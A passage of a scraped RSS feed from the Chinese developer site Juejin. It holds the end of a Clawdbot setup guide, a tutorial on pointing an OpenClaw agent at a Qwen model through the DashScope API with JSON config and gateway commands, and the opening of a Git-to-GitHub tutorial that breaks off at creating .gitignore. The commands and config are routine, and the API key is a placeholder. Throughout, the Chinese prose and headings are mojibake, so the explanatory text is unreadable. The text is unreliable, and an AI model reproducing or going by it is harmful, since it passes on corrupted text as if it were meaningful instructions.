  <span class="hljs-string">é…å¯¹:</span> <span class="hljs-string">clawdbot</span> <span class="hljs-string">pairing</span> <span class="hljs-string">approve</span> <span class="hljs-string">telegram</span> <span class="hljs-string">&lt;ç &gt;</span>
  <span class="hljs-string">é¢æ¿:</span> <span class="hljs-string">clawdbot</span> <span class="hljs-string">dashboard</span>

<span class="hljs-string">æ–‡ä»¶ç»“æ„:</span>
  <span class="hljs-string">~/.clawdbot/clawdbot.json:</span> <span class="hljs-string">ä¸»é…ç½®</span>
  <span class="hljs-string">~/.clawdbot/agents/main/agent/auth-profiles.json:</span> <span class="hljs-string">è®¤è¯</span>
  <span class="hljs-string">~/proxy-setup.js:</span> <span class="hljs-string">ä»£ç†è„šæœ¬</span>
  <span class="hljs-string">~/start-clawdbot.sh:</span> <span class="hljs-string">å¯åŠ¨è„šæœ¬</span>
</code></pre>
<p><strong>ä½¿ç”¨æ–¹æ³•ï¼š</strong> å¤åˆ¶ä¸Šæ–¹ YAML ä»£ç å—ï¼Œç›´æ¥ç²˜è´´ç»™ AI åŠ©æ‰‹ï¼Œå³å¯å¿«é€Ÿè·å¾— Clawdbot é…ç½®ç›¸å…³é—®é¢˜çš„è§£ç­”ã€‚</p>
<hr/>
<p><em>æœ¬æ–‡åŸºäº 2026 å¹´ 1 æœˆçš„å®é™…é…ç½®ç»å†æ’°å†™ï¼Œ ç”±claude-opus-4.5 + clawdbotæ•´ç†ç¼–å†™ã€‚</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[openclaw UIæ–¹å¼é…ç½®API]]></title>    <link>https://juejin.cn/post/7600953879500619827</link>    <guid>https://juejin.cn/post/7600953879500619827</guid>    <pubDate>2026-01-30T10:02:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600953879500619827" data-draft-id="7600967006893113353" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="openclaw UIæ–¹å¼é…ç½®API"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-30T10:02:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="luka1012"/> <meta itemprop="url" content="https://juejin.cn/user/4311612244630649"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            openclaw UIæ–¹å¼é…ç½®API
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4311612244630649/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    luka1012
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T10:02:29.000Z" title="Fri Jan 30 2026 10:02:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨æ‰§è¡Œ openclaw dashborad æŒ‡ä»¤åæ‰“å¼€å¸¦æœ‰tokençš„urlé“¾æ¥ï¼Œè¿›åˆ°å¦‚ä¸‹é¡µé¢</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9c398380efc4c47863470b9e5f10fd9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372148&amp;x-signature=NQj4%2Bqbgz8TH5BPw1N9GsjvN5dE%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-0">æ·»åŠ æ¨¡å‹  (è¿™é‡Œä»¥é€šä¹‰åƒé—® Max Thinking ç‰ˆä¸¾ä¾‹)</h3>
<p>å³ä¾§config --&gt;models --&gt; provider, ç‚¹å‡»add entry</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf0ffc6c302d4b39a261f6b54eefa8ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372148&amp;x-signature=K%2FNbg0XlQgVqde737e%2FuCQhQk70%3D" alt="image.png" loading="lazy"/></p>
<p>è¡¨æ ¼ä¸­å†…å®¹å¡«å†™æŒ‰ç…§å¦‚ä¸‹æ ¼å¼ï¼š</p>
<pre><code class="hljs language-json" lang="json">providers<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      bailian<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        baseUrl<span class="hljs-punctuation">:</span> <span class="hljs-string">"https://dashscope.aliyuncs.com/compatible-mode/v1"</span><span class="hljs-punctuation">,</span>
        apiKey<span class="hljs-punctuation">:</span> <span class="hljs-string">"æ›¿æ¢ä¸ºä½ çš„API key"</span><span class="hljs-punctuation">,</span>
        api<span class="hljs-punctuation">:</span> <span class="hljs-string">"openai-completions"</span><span class="hljs-punctuation">,</span>
        models<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
          <span class="hljs-punctuation">{</span>
            id<span class="hljs-punctuation">:</span> <span class="hljs-string">"qwen3-max-2026-01-23"</span><span class="hljs-punctuation">,</span>
            name<span class="hljs-punctuation">:</span> <span class="hljs-string">"é€šä¹‰åƒé—® Max Thinking ç‰ˆ"</span><span class="hljs-punctuation">,</span>
            reasoning<span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
            input<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"text"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
            cost<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> input<span class="hljs-punctuation">:</span> <span class="hljs-number">0.0025</span><span class="hljs-punctuation">,</span> output<span class="hljs-punctuation">:</span> <span class="hljs-number">0.01</span><span class="hljs-punctuation">,</span> cacheRead<span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> cacheWrite<span class="hljs-punctuation">:</span> <span class="hljs-number">0</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
            contextWindow<span class="hljs-punctuation">:</span> <span class="hljs-number">262144</span><span class="hljs-punctuation">,</span>
            maxTokens<span class="hljs-punctuation">:</span> <span class="hljs-number">65536</span>
          <span class="hljs-punctuation">}</span>
        <span class="hljs-punctuation">]</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-1">åº”ç”¨æ¨¡å‹</h3>
<p>å°†æ·»åŠ çš„æ¨¡å‹è®¾ä¸ºé»˜è®¤ï¼š
config --&gt; agents --&gt;Default --&gt;Model
æŒ‰ç…§ä»¥ä¸‹æ ¼å¼å¡«å†™å†…å®¹</p>
<p>ï¼ˆ1. åœ¨modelsé‡Œæ·»åŠ entry</p>
<ol start="2">
<li>å°†primary model å­—æ®µæ”¹ä¸ºbailian/qwen3-max-2026-01-23ï¼‰</li>
</ol>
<pre><code class="hljs language-json" lang="json">agents<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    defaults<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      model<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> primary<span class="hljs-punctuation">:</span> <span class="hljs-string">"bailian/qwen3-max-2026-01-23"</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      models<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"bailian/qwen3-max-2026-01-23"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> alias<span class="hljs-punctuation">:</span> <span class="hljs-string">"é€šä¹‰åƒé—® Max Thinking ç‰ˆ"</span> <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
</code></pre>
<p>å¦‚å›¾</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1529e93bc0c04da28b56bca1819cf583~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372148&amp;x-signature=7MaFUTCBq0dG0OSC%2BbXof57VzNo%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3dd5c89b28aa4c6da7d1db7db1e6a8a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372148&amp;x-signature=BUdOL3DGGc1XRS%2BVtsGQ66GVtGU%3D" alt="image.png" loading="lazy"/></p>
<p><strong>ç‚¹å‡»save ä¿å­˜é…ç½®</strong></p>
<h3 data-id="heading-2"><strong>é…ç½®ç”Ÿæ•ˆ + éªŒè¯æ¨¡å‹çŠ¶æ€</strong></h3>
<p>åœ¨ç»ˆç«¯è¿è¡Œä»¥ä¸‹æŒ‡ä»¤ï¼Œä¿è¯é…ç½®èƒ½å¤Ÿç”Ÿæ•ˆï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ–¹å¼ä¸€ï¼šåœæ­¢æœåŠ¡åï¼Œå†å¯åŠ¨æœåŠ¡</span>
openclaw gateway stop
<span class="hljs-comment"># ç­‰å¾… 2-3 ç§’åå¯åŠ¨æœåŠ¡</span>
openclaw gateway start
<span class="hljs-comment"># æ–¹å¼äºŒï¼šç›´æ¥ä½¿ç”¨é‡å¯å‘½ä»¤</span>
openclaw gateway restart
</code></pre>
<p>ä½ è¿˜å¯ä»¥é€šè¿‡ä»¥ä¸‹æŒ‡ä»¤çœ‹åˆšåˆšè®¾ç½®çš„æ¨¡å‹æ˜¯å¦è¢« Clawdbot è¯†åˆ«ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">openclaw models list
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7dad413a48345ccad9f4a735cb1cd42~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372148&amp;x-signature=INJSWEYmNWOUbPbuNmqt6rpWc4Y%3D" alt="image.png" loading="lazy"/></p>
<p>ä½ è¿˜å¯ä»¥é€šè¿‡ä»¥ä¸‹æŒ‡ä»¤è¿›è¡Œä¸€æ¬¡çœŸå®è¿é€šæ¢æµ‹ï¼ˆä¼šå‘çœŸå®è¯·æ±‚ï¼Œå¯èƒ½äº§ç”Ÿè´¹ç”¨~ï¼‰</p>
<pre><code class="hljs language-bash" lang="bash">openclaw models status --probe
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d1562e5d9d34d448d803d8fda4f7d58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372148&amp;x-signature=B%2ByahbntNMnFZef2zejOmUrYriE%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">æå®š</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33e2754ceb2a41d1b961876aef0f171f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372148&amp;x-signature=%2BEtOF%2F7POn4jOkmtxZOnoxlw3Jc%3D" alt="image.png" loading="lazy"/></p>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.aliyun.com%2Farticle%2F1708855%3Fspm%3D5176.454194655176.J_L02u6VphiK2DqbAEtTYRj.3.1ba44859qmPsDh" target="_blank" title="https://developer.aliyun.com/article/1708855?spm=5176.454194655176.J_L02u6VphiK2DqbAEtTYRj.3.1ba44859qmPsDh" ref="nofollow noopener noreferrer">ğŸ¦ å¦‚ä½•åœ¨ Moltbot é…ç½®é˜¿é‡Œäº‘ç™¾ç‚¼ API-é˜¿é‡Œäº‘å¼€å‘è€…ç¤¾åŒº</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[[gitç‰ˆæœ¬æ§åˆ¶]å…ˆæœ‰æœ¬åœ°é¡¹ç›®, å†è¿›è¡Œgithubç‰ˆæœ¬æ§åˆ¶(äº²æµ‹å¯ç”¨)]]></title>    <link>https://juejin.cn/post/7600752623068233738</link>    <guid>https://juejin.cn/post/7600752623068233738</guid>    <pubDate>2026-01-30T08:00:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600752623068233738" data-draft-id="7600967006892310537" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="[gitç‰ˆæœ¬æ§åˆ¶]å…ˆæœ‰æœ¬åœ°é¡¹ç›®, å†è¿›è¡Œgithubç‰ˆæœ¬æ§åˆ¶(äº²æµ‹å¯ç”¨)"/> <meta itemprop="keywords" content="Git"/> <meta itemprop="datePublished" content="2026-01-30T08:00:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="import_random"/> <meta itemprop="url" content="https://juejin.cn/user/2013961033882312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            [gitç‰ˆæœ¬æ§åˆ¶]å…ˆæœ‰æœ¬åœ°é¡¹ç›®, å†è¿›è¡Œgithubç‰ˆæœ¬æ§åˆ¶(äº²æµ‹å¯ç”¨)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2013961033882312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    import_random
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T08:00:41.000Z" title="Fri Jan 30 2026 08:00:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æˆ‘æ¥ä¸ºä½ æä¾›ä¸€ä¸ªå®Œæ•´çš„ GitHub æ¨é€æ­¥éª¤ï¼š</p>
<h2 data-id="heading-0"><strong>æ­¥éª¤ 1ï¼šå‡†å¤‡å·¥ä½œ</strong></h2>
<h3 data-id="heading-1">1.1 å®‰è£…å’Œé…ç½® Git</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦å·²å®‰è£… Git</span>
git --version

<span class="hljs-comment"># å¦‚æœæ²¡æœ‰å®‰è£…ï¼Œå…ˆå®‰è£… Git</span>
<span class="hljs-comment"># Windows: ä¸‹è½½ Git for Windows</span>
<span class="hljs-comment"># Mac: brew install git</span>
<span class="hljs-comment"># Linux: sudo apt-get install git</span>

<span class="hljs-comment"># é…ç½®ç”¨æˆ·åå’Œé‚®ç®±</span>
git config --global user.name <span class="hljs-string">"ä½ çš„åå­—"</span>
git config --global user.email <span class="hljs-string">"ä½ çš„é‚®ç®±"</span>
</code></pre>
<h3 data-id="heading-2">1.2 åˆ›å»º GitHub è´¦å·ï¼ˆå¦‚æœè¿˜æ²¡æœ‰ï¼‰</h3>
<ul>
<li>è®¿é—® <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com" target="_blank" title="https://github.com" ref="nofollow noopener noreferrer">github.com</a> æ³¨å†Œè´¦å·</li>
<li>å»ºè®®è®¾ç½® SSH Keyï¼ˆå¯é€‰ä½†æ¨èï¼‰</li>
</ul>
<h2 data-id="heading-3"><strong>æ­¥éª¤ 2ï¼šåœ¨ GitHub ä¸Šåˆ›å»ºè¿œç¨‹ä»“åº“</strong></h2>
<ol>
<li>ç™»å½• GitHub</li>
<li>ç‚¹å‡»å³ä¸Šè§’ "+" â†’ "New repository"</li>
<li>å¡«å†™ä»“åº“ä¿¡æ¯ï¼š
<ul>
<li>Repository name: é¡¹ç›®åç§°</li>
<li>Description: é¡¹ç›®æè¿°ï¼ˆå¯é€‰ï¼‰</li>
<li>é€‰æ‹© Publicï¼ˆå…¬å¼€ï¼‰æˆ– Privateï¼ˆç§æœ‰ï¼‰</li>
<li><strong>ä¸è¦</strong>å‹¾é€‰ "Initialize this repository with a README"ï¼ˆæœ¬åœ°å·²æœ‰é¡¹ç›®ï¼‰</li>
</ul>
</li>
<li>ç‚¹å‡» "Create repository"</li>
</ol>
<h2 data-id="heading-4"><strong>æ­¥éª¤ 3ï¼šæœ¬åœ°é¡¹ç›®åˆå§‹åŒ–</strong></h2>
<h3 data-id="heading-5">3.1 åˆå§‹åŒ– Git ä»“åº“</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># è¿›å…¥é¡¹ç›®ç›®å½•</span>
<span class="hljs-built_in">cd</span> /path/to/your/project

<span class="hljs-comment"># åˆå§‹åŒ–æœ¬åœ°ä»“åº“</span>
git init
</code></pre>
<h3 data-id="heading-6">3.2 åˆ›å»º .gitignore æ–‡ä»¶ï¼ˆé‡è¦ï¼‰</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ›å»º .gitignore æ–‡ä»¶ï¼Œæ’é™¤ä¸éœ€è¦ç‰ˆæœ¬æ§åˆ¶çš„æ–‡ä»¶</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"node_modules/"</span> &gt;&gt; .gitignore
